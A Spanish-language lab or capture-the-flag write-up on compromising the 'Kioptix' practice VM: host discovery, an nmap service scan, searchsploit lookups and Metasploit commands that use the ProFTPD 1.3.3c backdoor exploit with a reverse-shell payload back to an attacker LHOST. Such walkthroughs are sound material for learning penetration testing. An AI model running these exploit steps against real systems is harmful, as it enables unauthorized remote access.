# Cómo he vulnerando la máquina Kioptix 

### Primero hice un reconicimiento de la red en busca de la IP de la máquina virtual (siendo que únicamente conozco la MAC y la red padre):

sudo netdiscover

nmap -sn 10.0.0.0/19

### Obtengo la IP de la máquina a atacar:

10.0.8.6

### Seguidamente hice un nmap -sV en busqueda de puertos abiertos junto al servicio que usa y su versión:
```
ismael@ismael-VirtualBox:~/Escritorio$ nmap -sV 10.0.8.6
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-18 15:14 CET
Nmap scan report for 10.0.8.6
Host is up (0.00066s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.70 seconds
```
### Analizo con metasploit los servicios de la máquina atacada (solo mostraré los outputs más interesantes)
```
searchsploit ProFTPD 1.3.3c

ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution                                             | linux/remote/15662.txt
ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)                                                       | linux/remote/16921.rb
```
```
searchsploit ssh 7.2p2

OpenSSH 7.2 - Denial of Service                                                                                        | linux/dos/40888.py
OpenSSH 7.2p2 - Username Enumeration                                                                                   | linux/remote/40136.py
```
```
searchsploit apache 2.4.18

Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                      | php/remote/29316.py
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation                                  
| linux/local/46676.php
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                           | linux/dos/36906.txt
```
### Aparentemente la forma más sencilla de vulnerar la máquina es mediante el exploit de reverse console del protocolo ProFTPD versión 1.3.3c, usando el exploit unix/ftp/proftpd_133c_backdoor con la payload genérica de reverse console payload/cmd/unix/reverse

```
msfconsole
search ProFTPD 1.3.3c
use 0
show options
set RHOSTS 10.0.8.6
show payloads
set PAYLOAD cmd/unix/reverse
set LHOST 10.0.2.15
show options
run
```
### (La demonstración de que realmente obtuve acceso a la máquina está junto a este fichero)
